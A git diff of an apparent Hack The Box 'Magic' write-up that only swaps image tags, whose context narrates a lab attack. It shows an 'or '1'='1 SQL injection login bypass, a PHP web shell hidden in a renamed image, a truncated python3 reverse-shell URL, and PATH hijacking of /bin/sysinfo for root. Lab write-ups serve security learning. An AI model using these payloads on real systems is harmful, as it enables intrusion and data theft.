@@ -10,19 +10,19 @@ image: /assets/img/htb/Magic/magic_infocard.png
 
 <p>Let's do a NMAP scan</p>
 
-<img src="/assets/img/htb/Magic/01_nmap.png">
+![dekstop](/assets/img/htb/Magic/01_nmap.png)
 
 <p>
 Browsing to http://10.10.10.185 we get a page with images and on the bottom left a login to upload images.
 </p>
 
-<img src="/assets/img/htb/Magic/02_login_message.png">
+![dekstop](/assets/img/htb/Magic/02_login_message.png)
 
 <p>
 Let's click on the login link.
 </p>
 
-<img src="/assets/img/htb/Magic/03_login_blank.png">
+![dekstop](/assets/img/htb/Magic/03_login_blank.png)
 
 <p>
 I tried default top 10 usernames and passwords combos but nothing.
@@ -34,7 +34,7 @@ username: 'or '1'='1
 password: 'or '1'='1
 </p>
 
-<img src="/assets/img/htb/Magic/04_login_sql.png">
+![dekstop](/assets/img/htb/Magic/04_login_sql.png)
 
 <p>
 
@@ -42,7 +42,7 @@ We get prompted with an upload page for images.
 
 </p>
 
-<img src="/assets/img/htb/Magic/05_upload_img.png">
+![dekstop](/assets/img/htb/Magic/05_upload_img.png)
 
 <p>
 
@@ -50,7 +50,7 @@ Let's see what can be uploaded. Let's just click upload.
 
 </p>
 
-<img src="/assets/img/htb/Magic/06_upload_img_error.png">
+![dekstop](/assets/img/htb/Magic/06_upload_img_error.png)
 
 <p>
 
@@ -66,7 +66,7 @@ Take any JPG,JPEG or PNG inject it with some code and then rename the file.
 
 </p>
 
-<img src="/assets/img/htb/Magic/07_cmd_image_insert.png">
+![dekstop](/assets/img/htb/Magic/07_cmd_image_insert.png)
 
 <p>
 
@@ -82,7 +82,7 @@ http://10.10.10.185/images/uploads/lordcommander.php.jpeg?cmd=python3 -c 'import
 
 </p>
 
-<img src="/assets/img/htb/Magic/08_img_rev_shell.png">
+![dekstop](/assets/img/htb/Magic/08_img_rev_shell.png)
 
 <p>
 
@@ -103,7 +103,7 @@ After enumerating a bit we get the following.
 
 </p>
 
-<img src="/assets/img/htb/Magic/09_db_details.png">
+![dekstop](/assets/img/htb/Magic/09_db_details.png)
 
 <p>
 
@@ -115,7 +115,7 @@ Let's enumerate the database. There is no mysql client installed so the only way
 
 </p>
 
-<img src="/assets/img/htb/Magic/10_db_dump.png">
+![dekstop](/assets/img/htb/Magic/10_db_dump.png)
 
 <p>
 
@@ -123,7 +123,7 @@ We then find this in the dump.
 
 </p>
 
-<img src="/assets/img/htb/Magic/11_db_creds.png">
+![dekstop](/assets/img/htb/Magic/11_db_creds.png)
 
 <p>
 
@@ -134,7 +134,7 @@ Let us just su to the user with the password.
 </p>
 
 
-<img src="/assets/img/htb/Magic/12_user_login_png.png">
+![dekstop](/assets/img/htb/Magic/12_user_login_png.png)
 
 <p>
 
@@ -148,7 +148,7 @@ I uploaded both LinEnum and LinPEAS and found this pretty interesting:
 
 </p>
 
-<img src="/assets/img/htb/Magic/13_exec_files.png">
+![dekstop](/assets/img/htb/Magic/13_exec_files.png)
 
 <p> 
 
@@ -158,7 +158,7 @@ There is another tool called pspy64 which monitors linux processes and we can us
 
 </p>
 
-<img src="/assets/img/htb/Magic/14_fdisk.png">
+![dekstop](/assets/img/htb/Magic/14_fdisk.png)
 
 <p>
 
@@ -174,7 +174,7 @@ We then create a file in /tmp with the following.
 
 </p>
 
-<img src="/assets/img/htb/Magic/15_python_shell.png">
+![dekstop](/assets/img/htb/Magic/15_python_shell.png)
 
 <p>
 
@@ -182,7 +182,7 @@ Make it executable and then run /bin/sysinfo again and we watch pspy64.
 
 </p>
 
-<img src="/assets/img/htb/Magic/16_run_script.png">
+![dekstop](/assets/img/htb/Magic/16_run_script.png)
 
 <p>
 
@@ -192,7 +192,7 @@ Let us pop to the terminal where we can our nc.
 
 </p>
 
-<img src="/assets/img/htb/Magic/17_shell_pop.png">
+![dekstop](/assets/img/htb/Magic/17_shell_pop.png)
 
 <p>
 
